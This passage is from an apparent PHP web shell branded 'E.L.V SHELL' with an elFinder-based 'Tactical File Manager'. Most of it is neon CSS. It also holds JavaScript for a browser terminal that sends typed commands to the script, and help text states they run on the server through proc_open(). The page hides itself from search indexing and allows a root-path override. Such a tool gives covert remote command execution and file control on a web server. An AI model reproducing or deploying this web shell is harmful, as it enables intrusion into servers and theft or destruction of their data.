#top .cwd::before{
  content:"◉ ";
  color:var(--cyan);
  text-shadow:0 0 6px var(--cyan);
}
.tbtn{
  text-decoration:none;
  font-family:'Rajdhani',sans-serif;
  font-weight:600;
  font-size:11px;
  letter-spacing:2.5px;
  text-transform:uppercase;
  color:var(--cyan);
  background:rgba(0,240,255,.05);
  border:1px solid rgba(0,240,255,.4);
  padding:7px 12px;
  border-radius:2px;
  transition:all .2s ease;
  cursor:pointer;
  display:inline-flex;
  align-items:center;
  gap:6px;
  white-space:nowrap;
  flex-shrink:0;
  user-select:none;
  font-family:inherit;
}
.tbtn:hover{
  color:#fff;
  border-color:var(--magenta);
  background:rgba(255,0,229,.12);
  box-shadow:0 0 12px rgba(255,0,229,.4);
}
.tbtn.magenta{color:var(--magenta);border-color:rgba(255,0,229,.5);background:rgba(255,0,229,.06)}
.tbtn.green{color:var(--green);border-color:rgba(0,255,157,.5);background:rgba(0,255,157,.06)}
.tbtn.green:hover{border-color:var(--green);background:rgba(0,255,157,.15);box-shadow:0 0 12px rgba(0,255,157,.5)}

/* ===== TERMINAL BODY ===== */
#body{
  flex:1;
  overflow-y:auto;
  padding:14px 18px;
  scrollbar-width:thin;
  scrollbar-color:var(--cyan) transparent;
  background:transparent;
}
#body::-webkit-scrollbar{width:9px}
#body::-webkit-scrollbar-track{background:transparent}
#body::-webkit-scrollbar-thumb{
  background:linear-gradient(180deg,#0099aa,#aa0099);
  border-radius:5px;
  border:2px solid var(--bg);
}
#body::-webkit-scrollbar-thumb:hover{
  background:linear-gradient(180deg,var(--cyan),var(--magenta));
}

.line{
  white-space:pre-wrap;
  word-wrap:break-word;
  word-break:break-word;
  padding:1px 0;
}
.cmd{
  color:var(--cyan);
  text-shadow:0 0 3px rgba(0,240,255,.35);
}
.cmd .p{
  color:var(--magenta);
  margin-right:6px;
  font-weight:bold;
  text-shadow:0 0 4px rgba(255,0,229,.6);
}
.out{color:#c9dcf0}
.err{color:var(--red)}
.meta{color:var(--text-faint);font-style:italic;font-size:12px}
.ok{color:var(--green);font-size:11px;opacity:.7}

/* ===== INPUT LINE ===== */
#inputline{
  flex-shrink:0;
  display:flex;
  align-items:center;
  gap:8px;
  padding:10px 18px;
  background:linear-gradient(180deg, rgba(0,0,0,.4), rgba(0,0,0,.7));
  border-top:1px solid var(--border);
  font-size:13.5px;
}
#inputline .p{
  color:var(--magenta);
  font-weight:bold;
  text-shadow:0 0 6px rgba(255,0,229,.7);
  user-select:none;
  white-space:nowrap;
}
#cmd{
  flex:1;
  background:transparent;
  border:none;
  outline:none;
  color:var(--cyan);
  font-family:inherit;
  font-size:13.5px;
  letter-spacing:.4px;
  text-shadow:0 0 3px rgba(0,240,255,.35);
  caret-color:var(--cyan);
  padding:0;
}
#cmd::placeholder{color:var(--text-faint);letter-spacing:1px}
#busy{
  color:var(--amber);
  font-size:11px;
  letter-spacing:2px;
  animation:blink 1s ease-in-out infinite;
  display:none;
}
#busy.on{display:inline}
@keyframes blink{50%{opacity:.3}}

/* Mobile */
@media (max-width:640px){
  #top{height:auto;padding:8px 10px;flex-wrap:wrap;gap:6px}
  #top .brand .b1{font-size:15px;letter-spacing:2px}
  #top .brand .b2{font-size:8px;letter-spacing:2px}
  #top .brand .b3{font-size:8px;padding:1px 4px}
  #top .cwd{font-size:10px;width:100%;order:3;flex-basis:100%}
  .tbtn{padding:5px 8px;font-size:9px;letter-spacing:1.5px}
  .tbtn .lbl{display:none}
  #body{padding:10px 12px}
  #inputline{padding:8px 12px;font-size:12px}
  #cmd{font-size:12px}
}
</style>
</head>
<body>

<header id="top">
  <div class="brand">
    <span class="b1">E.L.V</span>
    <span class="b2">SHELL</span>
    <span class="b3" title="by HxN">HxN</span>
  </div>
  <div class="cwd" id="cwd" title="<?php echo htmlspecialchars($ELV_ROOT); ?>"><?php echo htmlspecialchars($ELV_ROOT); ?></div>
  <a class="tbtn" href="<?php echo htmlspecialchars($elv_home); ?>" title="Balik ke File Manager">
    <span>⬅</span><span class="lbl">FILES</span>
  </a>
  <button class="tbtn magenta" id="clear-btn" title="Clear (Ctrl+L)">
    <span>⌫</span><span class="lbl">CLEAR</span>
  </button>
  <button class="tbtn green" id="fs-btn" title="Fullscreen">
    <span>⛶</span><span class="lbl">FULL</span>
  </button>
</header>

<div id="body"></div>

<div id="inputline">
  <span class="p" id="prompt">$</span>
  <input type="text" id="cmd" autocomplete="off" spellcheck="false" autocapitalize="off" placeholder="type command and press Enter..." autofocus>
  <span id="busy">● RUNNING</span>
</div>
<script>
(function(){
  var URL_ENDPOINT = <?php echo json_encode($elv_self); ?>;
  var cwd = <?php echo json_encode($ELV_ROOT); ?>;
  var body = document.getElementById('body');
  var cmd = document.getElementById('cmd');
  var busy = document.getElementById('busy');
  var cwdEl = document.getElementById('cwd');
  var promptEl = document.getElementById('prompt');
  var isBusy = false;

  var HISTORY_KEY = 'elv_shell_history_v1';
  var history = [];
  try { history = JSON.parse(localStorage.getItem(HISTORY_KEY) || '[]') || []; }
  catch(e){ history = []; }
  var histIdx = -1;

  function esc(s){
    return String(s).replace(/[&<>"']/g, function(c){
      return ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'})[c];
    });
  }
  function shortCwd(p){
    if (p.length <= 44) return p;
    var parts = p.split('/');
    if (parts.length <= 3) return p;
    return '…/' + parts.slice(-3).join('/');
  }
  function updateCwd(){
    cwdEl.textContent = shortCwd(cwd);
    cwdEl.title = cwd;
    document.title = 'E.L.V SHELL // ' + shortCwd(cwd);
  }
  updateCwd();

  function append(cls, text){
    if (text === null || typeof text === 'undefined' || text === '') return;
    var d = document.createElement('div');
    d.className = 'line ' + (cls || 'out');
    d.textContent = text;
    body.appendChild(d);
  }
  function echoCmd(line){
    var d = document.createElement('div');
    d.className = 'line cmd';
    d.innerHTML = '<span class="p">$</span>' + esc(line);
    body.appendChild(d);
  }
  function appendMeta(t){
    var d = document.createElement('div');
    d.className = 'line meta';
    d.textContent = t;
    body.appendChild(d);
  }
  function appendOk(code){
    var d = document.createElement('div');
    d.className = 'line ok';
    d.textContent = '// exit ' + code;
    body.appendChild(d);
  }
  function scrollBottom(){
    body.scrollTop = body.scrollHeight;
  }
  function setBusy(b){
    isBusy = b;
    busy.classList.toggle('on', b);
  }

  appendMeta('// E.L.V SHELL — ' + new Date().toString());
  appendMeta('// marker — by HxN for E.L.V');
  appendMeta('// cwd: ' + cwd);
  appendMeta('// tips: ↑↓ history · Ctrl+L clear · Ctrl+C cancel · Tab autocomplete');
  appendMeta('');

  function pushHistory(line){
    if (!line) return;
    if (history[0] === line) return;
    history.unshift(line);
    if (history.length > 300) history.length = 300;
    try { localStorage.setItem(HISTORY_KEY, JSON.stringify(history)); } catch(e){}
  }

  function run(line){
    if (isBusy) return;
    var low = line.trim().toLowerCase();

    echoCmd(line);
    scrollBottom();

    if (low === '') { cmd.value = ''; return; }

    if (low === 'clear' || low === 'cls') {
      body.innerHTML = '';
      appendMeta('// cleared');
      cmd.value = ''; scrollBottom();
      return;
    }
    if (low === 'exit' || low === 'quit' || low === 'close') {
      location.href = <?php echo json_encode($elv_home); ?>;
      return;
    }
    if (low === 'help') {
      appendMeta('Built-in commands:');
      appendMeta('  clear          - clear screen');
      appendMeta('  exit           - kembali ke file manager');
      appendMeta('  history        - lihat command history');
      appendMeta('  whoami, pwd    - dijalankan via shell');
      appendMeta('Semua command shell lain dijalankan di server via proc_open().');
      appendMeta('');
      cmd.value = ''; scrollBottom();
      return;
    }
    if (low === 'history') {
      history.slice(0, 50).forEach(function(h, i){
        appendMeta(String(i+1).padStart(3, ' ') + '  ' + h);
      });
      appendMeta('');
      cmd.value = ''; scrollBottom();
      return;
    }

    pushHistory(line);
    histIdx = -1;
    setBusy(true);

    fetch(URL_ENDPOINT, {
      method: 'POST',
      headers: {'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'},
      body: 'elv_action=term'

          + '&cmd='   + encodeURIComponent(line)

          + '&cwd='   + encodeURIComponent(cwd)

          + '&nonce=' + encodeURIComponent(NONCE),
      credentials: 'same-origin'
    })
    .then(function(r){ return r.json(); })
    .then(function(res){
      if (!res || !res.ok) {
        append('err', '// error: ' + ((res && res.error) ? res.error : 'unknown'));
        return;
      }
      if (res.cwd && res.cwd !== cwd) {
        cwd = res.cwd;
        updateCwd();
      }
      if (res.out) append('out', res.out.replace(/\n+$/, ''));
      if (res.err) append('err', res.err.replace(/\n+$/, ''));
      if (!res.out && !res.err) {
        appendOk(res.code || 0);
      } else if (typeof res.code === 'number' && res.code !== 0) {
        appendOk(res.code);
      }
    })
    .catch(function(err){
      append('err', '// request gagal: ' + err.message);
    })
    .then(function(){
      setBusy(false);
      cmd.value = '';
      cmd.focus();
      scrollBottom();
    });
  }

  cmd.addEventListener('keydown', function(e){
    if (e.ctrlKey && (e.key === 'l' || e.key === 'L')) {
      e.preventDefault();
      body.innerHTML = '';
      appendMeta('// cleared');
      return;
    }
    if (e.ctrlKey && (e.key === 'c' || e.key === 'C')) {
      if (!window.getSelection().toString()) {
        e.preventDefault();
        if (cmd.value) {
          var d = document.createElement('div');
          d.className = 'line cmd';
          d.innerHTML = '<span class="p">$</span>' + esc(cmd.value) + ' <span class="err">^C</span>';
          body.appendChild(d);
          cmd.value = '';
          scrollBottom();
        }
      }
      return;
    }
    if (e.key === 'Enter') {
      e.preventDefault();
      if (isBusy) return;
      run(cmd.value);
      return;
    }
    if (e.key === 'ArrowUp') {
      e.preventDefault();
      if (!history.length) return;
      if (histIdx < history.length - 1) histIdx++;
      cmd.value = history[histIdx] || '';
      setTimeout(function(){ cmd.setSelectionRange(cmd.value.length, cmd.value.length); }, 0);
      return;
    }
    if (e.key === 'ArrowDown') {
      e.preventDefault();
      if (histIdx > 0) { histIdx--; cmd.value = history[histIdx]; }
      else { histIdx = -1; cmd.value = ''; }
      return;
    }
    if (e.key === 'Tab') {
      e.preventDefault();
      var v = cmd.value;
      if (!v) return;
      for (var i = 0; i < history.length; i++) {
        if (history[i].indexOf(v) === 0 && history[i] !== v) {
          cmd.value = history[i];
          break;
        }
      }
    }
  });

  document.getElementById('clear-btn').addEventListener('click', function(){
    body.innerHTML = '';
    appendMeta('// cleared');
    cmd.focus();
  });

  document.getElementById('fs-btn').addEventListener('click', function(){
    var el = document.documentElement;
    if (!document.fullscreenElement) {
      (el.requestFullscreen || el.webkitRequestFullscreen || el.msRequestFullscreen || function(){}).call(el);
    } else {
      (document.exitFullscreen || document.webkitExitFullscreen || document.msExitFullscreen || function(){}).call(document);
    }
  });

  body.addEventListener('click', function(){ cmd.focus(); });
  setTimeout(function(){ cmd.focus(); }, 80);
})();
</script>
</body>
</html>
    <?php
    exit;
}

/* ============================== HALAMAN UI ============================== */
header('X-Frame-Options: DENY');
header('X-Content-Type-Options: nosniff');
header('Referrer-Policy: no-referrer');

$elv_self        = elv_self_url();
$elv_locale      = preg_replace('/[^a-zA-Z0-9_-]/', '', $ELV['locale']);
if ($elv_locale === '') { $elv_locale = 'en'; }

$elv_parent      = dirname($ELV_ROOT);
$elv_has_parent  = ($elv_parent && $elv_parent !== $ELV_ROOT && is_dir($elv_parent));
$elv_is_override = !empty($_SESSION['elv_root_override']);
?><!DOCTYPE html>
<html lang="<?php echo htmlspecialchars($elv_locale); ?>">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="robots" content="noindex, nofollow">
<title>E.L.V MANAGER - Tactical File Manager</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@500;600;700&family=Share+Tech+Mono&display=swap" rel="stylesheet">
<link rel="stylesheet" href="<?php echo htmlspecialchars($ELV['elfinder_cdn']); ?>css/elfinder.min.css">
<link rel="stylesheet" href="<?php echo htmlspecialchars($ELV['elfinder_cdn']); ?>css/theme.css">
<link rel="stylesheet" href="<?php echo htmlspecialchars($ELV['codemirror_cdn']); ?>lib/codemirror.min.css">
<link rel="stylesheet" href="<?php echo htmlspecialchars($ELV['codemirror_cdn']); ?>theme/monokai.min.css">
<style>
:root{
  --bg:#05060a;
  --bg2:#0b0d18;
  --surface:#0f1120;
  --surface2:#161a2e;
  --border:#232840;
  --border-lit:#33415c;
  --cyan:#00f0ff;
  --cyan-dim:#0099aa;
  --magenta:#ff00e5;
  --magenta-dim:#aa0099;
  --violet:#8b00ff;
  --green:#00ff9d;
  --amber:#ffb02e;
  --text:#dbe7f5;
  --text-dim:#6a7a90;
  --text-faint:#3a4458;
}
*{box-sizing:border-box}
html,body{
  margin:0;padding:0;height:100%;
  background:var(--bg);
  color:var(--text);
  font-family:'Rajdhani','Segoe UI',sans-serif;
  overflow:hidden;
}

/* ============ LAYOUT ============ */
#app{
  display:flex;
  flex-direction:column;
  height:100vh;
}

/* ============ TOP BAR ============ */
.elv-top{
  height:56px;
  display:flex;
  align-items:center;
  gap:10px;
  padding:0 16px;
  background:linear-gradient(180deg, #0d0f1e 0%, #07080f 100%);
  border-bottom:1px solid var(--border);
  position:relative;
  z-index:10;
  flex-shrink:0;
}
.elv-top::after{
  content:"";
  position:absolute;
  left:0; right:0; bottom:-1px;
  height:1px;
  background:linear-gradient(90deg,
    transparent 0%,
    var(--cyan) 25%,
    var(--magenta) 50%,
    var(--cyan) 75%,
    transparent 100%);
  opacity:.55;
}

/* Brand */
.elv-brand{
  display:flex;
  align-items:baseline;
  gap:8px;
  padding-right:14px;
  border-right:1px solid var(--border);
  user-select:none;
  flex-shrink:0;
}
.elv-brand .b1{
  font-family:'Rajdhani',sans-serif;
  font-weight:700;
  font-size:20px;
  letter-spacing:3px;
  color:#fff;
  text-shadow:
    0 0 6px rgba(0,240,255,0.8),
    0 0 14px rgba(0,240,255,0.5),
    0 0 24px rgba(255,0,229,0.3);
}
.elv-brand .b2{
  font-family:'Rajdhani',sans-serif;
  font-weight:600;
  font-size:10px;
  letter-spacing:5px;
  color:var(--cyan);
  text-transform:uppercase;
  opacity:.85;
  margin-left:2px;
  padding:2px 6px;
  border:1px solid rgba(0,240,255,0.35);
  border-radius:2px;
}
.elv-brand .b3{
  font-family:'Share Tech Mono',monospace;
  font-weight:700;
  font-size:9px;
  letter-spacing:2px;
  color:var(--magenta);
  padding:2px 6px;
  margin-left:6px;
  border:1px solid rgba(255,0,229,0.45);
  border-radius:2px;
  background:rgba(255,0,229,0.08);
  text-shadow:0 0 8px rgba(255,0,229,0.7);
  align-self:center;
}

/* Path */
.elv-path{
  flex:1;
  font-family:'Share Tech Mono',monospace;
  font-size:11px;
  letter-spacing:.5px;
  color:var(--text-dim);
  white-space:nowrap;
  overflow:hidden;
  text-overflow:ellipsis;
  display:flex;
  align-items:center;
  gap:8px;
  min-width:0;
}
.elv-path::before{
  content:"◉";
  color:var(--cyan);
  font-size:9px;
  text-shadow:0 0 6px var(--cyan);
  flex-shrink:0;
}
.elv-path .p{
  overflow:hidden;
  text-overflow:ellipsis;
}
.elv-path .badge{
  font-size:9px;
  letter-spacing:1.5px;
  padding:2px 6px;
  border:1px solid var(--magenta);
  color:var(--magenta);
  border-radius:2px;
  text-transform:uppercase;
  text-shadow:0 0 8px rgba(255,0,229,.7);
  flex-shrink:0;
}

/* Top bar buttons */
.elv-btn{
  text-decoration:none;
  font-family:'Rajdhani',sans-serif;
  font-weight:600;
  font-size:11px;
  letter-spacing:2.5px;
  text-transform:uppercase;
  color:var(--cyan);
  background:rgba(0,240,255,0.05);
  border:1px solid rgba(0,240,255,0.4);
  padding:8px 14px;
  border-radius:2px;
  transition:all .25s ease;
  cursor:pointer;
  display:inline-flex;
  align-items:center;
  gap:6px;
  white-space:nowrap;
  flex-shrink:0;
  user-select:none;
}
.elv-btn:hover{
  color:#fff;
  border-color:var(--magenta);
  background:rgba(255,0,229,0.12);
  box-shadow:0 0 16px rgba(255,0,229,0.4), inset 0 0 10px rgba(255,0,229,0.1);
}
.elv-btn[disabled]{
  opacity:.35;
  cursor:not-allowed;
  pointer-events:none;
}
.elv-btn.magenta{
  color:var(--magenta);
  border-color:rgba(255,0,229,.5);
  background:rgba(255,0,229,.06);
}
.elv-btn.green{
  color:var(--green);
  border-color:rgba(0,255,157,.5);
  background:rgba(0,255,157,.06);
}
.elv-btn.green:hover{
  border-color:var(--green);
  color:#fff;
  background:rgba(0,255,157,.15);
  box-shadow:0 0 16px rgba(0,255,157,.5);
}
.elv-btn .ico{
  font-size:14px;
  line-height:1;
}

/* ============ MAIN AREA ============ */
#main{
  flex:1;
  display:flex;
  flex-direction:column;
  min-height:0;
  position:relative;
}

#elfinder{
  flex:1;
  min-height:0;
  background:var(--bg2);
}

/* ============ CREDIT BAR ============ */
.elv-credit{
  flex-shrink:0;
  height:24px;
  display:flex;
  align-items:center;
  justify-content:center;
  gap:10px;
  background:linear-gradient(180deg, #07080f 0%, #0d0f1e 100%);
  border-top:1px solid var(--border);
  font-family:'Share Tech Mono',monospace;
  font-size:9px;
  letter-spacing:2px;
  text-transform:uppercase;
  color:var(--text-faint);
  position:relative;
}
.elv-credit::before{
  content:"";
  position:absolute;
  top:-1px; left:0; right:0; height:1px;
  background:linear-gradient(90deg,
    transparent 0%,
    var(--cyan) 25%,
    var(--magenta) 50%,
    var(--cyan) 75%,
    transparent 100%);
  opacity:.45;
}
.elv-credit .who{
  color:var(--cyan);
  letter-spacing:3px;
  text-shadow:0 0 6px rgba(0,240,255,.5);
}
.elv-credit .by b{
  color:var(--magenta);
  font-weight:700;
  letter-spacing:2px;
  text-shadow:0 0 6px rgba(255,0,229,.6);
}
.elv-credit .dot{color:var(--text-faint);opacity:.5}
.elv-credit .ver{color:var(--text-dim)}

/* Mobile */
@media (max-width: 640px){
  .elv-top{padding:0 10px;gap:6px}
  .elv-brand{padding-right:8px}
  .elv-brand .b1{font-size:15px;letter-spacing:2px}
  .elv-brand .b2{font-size:8px;letter-spacing:2px;padding:1px 4px}
  .elv-brand .b3{font-size:8px;padding:1px 4px;margin-left:3px}
  .elv-path{display:none}
  .elv-btn{padding:6px 8px;font-size:9px;letter-spacing:1.5px}
  .elv-btn .lbl{display:none}
  .elv-btn .ico{font-size:14px}
  .elv-credit{font-size:8px;gap:6px}
  .elv-credit .who{letter-spacing:2px}
}

/* ============================================================
   ELFINDER OVERRIDE
   ============================================================ */
body .ui-widget{
  font-family:'Rajdhani','Segoe UI',sans-serif !important;
  font-size:13px;
}
.elfinder{background:var(--bg2) !important;border:none !important;color:var(--text) !important}

/* ===== TOOLBAR ===== */
.elfinder-toolbar{background:var(--surface) !important;border-bottom:1px solid var(--border) !important;padding:6px 8px !important}
.elfinder-toolbar .elfinder-button{background:transparent !important;border:1px solid transparent !important;border-radius:3px !important;transition:all .2s ease !important}
.elfinder-toolbar .elfinder-button:hover{background:rgba(0,240,255,0.08) !important;border-color:rgba(0,240,255,0.35) !important;box-shadow:0 0 8px rgba(0,240,255,0.25) !important}
.elfinder-toolbar .elfinder-button.ui-state-disabled{opacity:.3 !important}
.elfinder-toolbar .ui-separator{border-left:1px solid var(--border) !important;border-right:none !important}
.elfinder-toolbar .elfinder-button-icon{filter:invert(75%) sepia(88%) saturate(1500%) hue-rotate(150deg) brightness(105%) !important;opacity:.9}
.elfinder-toolbar .elfinder-button:hover .elfinder-button-icon{filter:invert(85%) sepia(88%) saturate(1800%) hue-rotate(150deg) brightness(115%) !important;opacity:1}
.elfinder-toolbar .elfinder-button.ui-state-disabled .elfinder-button-icon{filter:grayscale(1) !important;opacity:.35}

/* ===== NAVBAR (sidebar) ===== */
.elfinder-navbar{
  background:var(--surface) !important;
  border-right:1px solid var(--border) !important;
  padding:10px 6px !important;
  font-size:14px !important;
}
.elfinder-navbar .elfinder-navbar-root{
  background:transparent !important;
  color:var(--cyan) !important;
  font-family:'Rajdhani',sans-serif !important;
  font-weight:700 !important;
  font-size:13px !important;
  letter-spacing:2.5px !important;
  text-transform:uppercase !important;
  padding:8px 12px !important;
  border-bottom:1px solid var(--border) !important;
  margin-bottom:6px !important;
  text-shadow:0 0 8px rgba(0,240,255,0.4) !important;
}
.elfinder-navbar .ui-state-default{
  background:transparent !important;
  border:1px solid transparent !important;
  border-radius:4px !important;
  color:var(--text) !important;
  padding:8px 12px 8px 32px !important;
  margin:2px 2px !important;
  font-family:'Rajdhani',sans-serif !important;
  font-size:14px !important;
  font-weight:500 !important;
  letter-spacing:.5px !important;
  line-height:1.3 !important;
  transition:all .18s ease !important;
  min-height:32px !important;
}
.elfinder-navbar .ui-state-hover{
  background:rgba(0,240,255,0.08) !important;
  border-color:rgba(0,240,255,0.3) !important;
  color:#fff !important;
  transform:translateX(2px);
}
.elfinder-navbar .ui-state-active{
  background:linear-gradient(90deg, rgba(255,0,229,0.2) 0%, rgba(255,0,229,0.05) 100%) !important;
  border:1px solid rgba(255,0,229,0.5) !important;
  color:#fff !important;
  box-shadow:0 0 12px rgba(255,0,229,0.35), inset 3px 0 0 var(--magenta) !important;
  font-weight:600 !important;
}
.elfinder-navbar .elfinder-navbar-arrow{
  filter:invert(75%) sepia(70%) saturate(2000%) hue-rotate(155deg) brightness(1.1) !important;
  opacity:.85;
}

/* Sidebar folder icon — SVG amber */
.elfinder-navbar-icon,
.elfinder-navbar .elfinder-cwd-icon-directory{
  width:20px !important;
  height:20px !important;
  background-image:url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%23ffb02e' stroke-width='1.8' stroke-linecap='round' stroke-linejoin='round'><path d='M3 7a2 2 0 0 1 2-2h4l2 2h8a2 2 0 0 1 2 2v8a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z' fill='%23ffb02e' fill-opacity='0.15'/><path d='M3 7a2 2 0 0 1 2-2h4l2 2h8a2 2 0 0 1 2 2v8a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z'/></svg>") !important;
  background-repeat:no-repeat !important;
  background-position:center !important;
  background-size:contain !important;
  filter:none !important;
  opacity:1 !important;
}
.elfinder-navbar .ui-state-hover .elfinder-navbar-icon{
  filter:drop-shadow(0 0 6px rgba(255,176,46,0.8)) !important;
}
.elfinder-navbar .ui-state-active .elfinder-navbar-icon{
  filter:drop-shadow(0 0 6px rgba(255,0,229,0.9)) !important;
  background-image:url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%23ff00e5' stroke-width='1.8' stroke-linecap='round' stroke-linejoin='round'><path d='M3 7a2 2 0 0 1 2-2h4l2 2h8a2 2 0 0 1 2 2v8a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z' fill='%23ff00e5' fill-opacity='0.2'/><path d='M3 7a2 2 0 0 1 2-2h4l2 2h8a2 2 0 0 1 2 2v8a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z'/></svg>") !important;
}

/* ===== CWD (file list) ===== */
.elfinder-cwd-wrapper{background:var(--bg2) !important;border:none !important;padding:12px !important}
.elfinder-cwd-view-icons .elfinder-cwd-file{
  background:transparent !important;
  border:1px solid transparent !important;
  border-radius:6px !important;
  transition:all .18s ease !important;
  padding:10px 8px !important;
  min-width:96px !important;
}
.elfinder-cwd-view-icons .elfinder-cwd-file.ui-state-hover{
  background:rgba(0,240,255,0.06) !important;
  border-color:rgba(0,240,255,0.25) !important;
  transform:translateY(-2px);
}
.elfinder-cwd-view-icons .elfinder-cwd-file.ui-selected,
.elfinder-cwd-view-icons .elfinder-cwd-file.ui-selecting{
  background:linear-gradient(135deg, rgba(255,0,229,0.18) 0%, rgba(139,0,255,0.15) 100%) !important;
  border:1px solid rgba(255,0,229,0.55) !important;
  box-shadow:0 0 18px rgba(255,0,229,0.35), inset 0 0 20px rgba(255,0,229,0.05) !important;
}
.elfinder-cwd-file .elfinder-cwd-filename{
  color:var(--text) !important;
  font-family:'Rajdhani',sans-serif !important;
  font-size:13px !important;
  font-weight:500 !important;
  letter-spacing:.3px !important;
  margin-top:6px !important;
  line-height:1.3 !important;
}
.elfinder-cwd-file.ui-selected .elfinder-cwd-filename{
  color:#fff !important;
  text-shadow:0 0 8px rgba(255,0,229,0.6) !important;
  font-weight:600 !important;
}

/* ============================================================
   SVG ICON REDESIGN — Modern Neon
   ============================================================ */

/* Base: hide old icon image, use background SVG */
.elfinder-cwd-icon{
  background:transparent !important;
  width:52px !important;
  height:52px !important;
  background-repeat:no-repeat !important;
  background-position:center !important;
  background-size:contain !important;
  filter:none !important;
  opacity:1 !important;
  margin:0 auto !important;
  image-rendering:auto;
}

/* FOLDER — amber folder dengan depth */
.elfinder-cwd-icon-directory{
  background-image:url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 64 64' fill='none'><defs><linearGradient id='fg' x1='0' y1='0' x2='0' y2='1'><stop offset='0' stop-color='%23ffb02e'/><stop offset='1' stop-color='%23ff6a00'/></linearGradient></defs><path d='M6 16a4 4 0 0 1 4-4h12l4 5h28a4 4 0 0 1 4 4v28a4 4 0 0 1-4 4H10a4 4 0 0 1-4-4z' fill='url(%23fg)' fill-opacity='0.28' stroke='%23ffb02e' stroke-width='2.5' stroke-linejoin='round'/><path d='M6 22h52' stroke='%23ffb02e' stroke-width='2' opacity='0.6'/></svg>") !important;
  filter:drop-shadow(0 0 8px rgba(255,176,46,0.55)) !important;
}

/* FILE (generic) — cyan document */
.elfinder-cwd-icon-application,
.elfinder-cwd-icon-text,
.elfinder-cwd-icon-x-php,
.elfinder-cwd-icon-x-empty{
  background-image:url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 64 64' fill='none'><path d='M14 8h26l14 14v38a2 2 0 0 1-2 2H14a2 2 0 0 1-2-2V10a2 2 0 0 1 2-2z' fill='%2300f0ff' fill-opacity='0.15' stroke='%2300f0ff' stroke-width='2.5' stroke-linejoin='round'/><path d='M40 8v14h14' stroke='%2300f0ff' stroke-width='2.5' stroke-linejoin='round'/><line x1='20' y1='34' x2='44' y2='34' stroke='%2300f0ff' stroke-width='2' opacity='0.7'/><line x1='20' y1='42' x2='44' y2='42' stroke='%2300f0ff' stroke-width='2' opacity='0.7'/><line x1='20' y1='50' x2='34' y2='50' stroke='%2300f0ff' stroke-width='2' opacity='0.7'/></svg>") !important;
  filter:drop-shadow(0 0 8px rgba(0,240,255,0.5)) !important;
}

/* CODE files — cyan with brackets */
.elfinder-cwd-icon-x-php,
.elfinder-cwd-icon-javascript,
.elfinder-cwd-icon-x-c,
.elfinder-cwd-icon-html,
.elfinder-cwd-icon-xml,
.elfinder-cwd-icon-css{
  background-image:url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 64 64' fill='none'><path d='M14 8h26l14 14v38a2 2 0 0 1-2 2H14a2 2 0 0 1-2-2V10a2 2 0 0 1 2-2z' fill='%2300f0ff' fill-opacity='0.15' stroke='%2300f0ff' stroke-width='2.5' stroke-linejoin='round'/><path d='M40 8v14h14' stroke='%2300f0ff' stroke-width='2.5' stroke-linejoin='round'/><path d='M24 34l-6 8 6 8M40 34l6 8-6 8M34 30l-4 24' stroke='%2300f0ff' stroke-width='2.2' stroke-linecap='round' stroke-linejoin='round'/></svg>") !important;
  filter:drop-shadow(0 0 8px rgba(0,240,255,0.55)) !important;
}

/* IMAGE — preview thumbnail natural */
.elfinder-cwd-icon-image,
.elfinder-cwd-icon-jpeg,
.elfinder-cwd-icon-png,
.elfinder-cwd-icon-gif,
.elfinder-cwd-icon-webp,
.elfinder-cwd-icon-bmp{
  border:1px solid rgba(0,240,255,0.4) !important;
  border-radius:5px !important;
  padding:2px !important;
  background-color:rgba(2,3,10,0.8) !important;
  background-size:cover !important;
  background-position:center !important;
  box-shadow:0 0 12px rgba(0,240,255,0.25), inset 0 0 20px rgba(0,0,0,0.4) !important;
  filter:none !important;
}

/* ARCHIVE — green box */
.elfinder-cwd-icon-archive,
.elfinder-cwd-icon-x-compressed,
.elfinder-cwd-icon-x-gzip,
.elfinder-cwd-icon-x-bzip,
.elfinder-cwd-icon-x-rar,
.elfinder-cwd-icon-x-7z-compressed{
  background-image:url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 64 64' fill='none'><rect x='12' y='10' width='40' height='44' rx='4' fill='%2300ff9d' fill-opacity='0.15' stroke='%2300ff9d' stroke-width='2.5'/><line x1='32' y1='10' x2='32' y2='30' stroke='%2300ff9d' stroke-width='2'/><rect x='28' y='18' width='8' height='6' rx='1' fill='%2300ff9d'/><rect x='28' y='32' width='8' height='6' rx='1' fill='%2300ff9d'/><circle cx='32' cy='46' r='3' fill='%2300ff9d'/></svg>") !important;
  filter:drop-shadow(0 0 8px rgba(0,255,157,0.5)) !important;
}

/* AUDIO / VIDEO — magenta play */
.elfinder-cwd-icon-audio,
.elfinder-cwd-icon-video{
  background-image:url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 64 64' fill='none'><rect x='8' y='14' width='48' height='36' rx='6' fill='%23ff00e5' fill-opacity='0.15' stroke='%23ff00e5' stroke-width='2.5'/><circle cx='32' cy='32' r='10' fill='%23ff00e5' fill-opacity='0.3' stroke='%23ff00e5' stroke-width='2'/><path d='M29 27l7 5-7 5z' fill='%23ff00e5'/></svg>") !important;
  filter:drop-shadow(0 0 8px rgba(255,0,229,0.55)) !important;
}

/* PDF — red-ish */
.elfinder-cwd-icon-pdf,
.elfinder-cwd-icon-x-pdf{
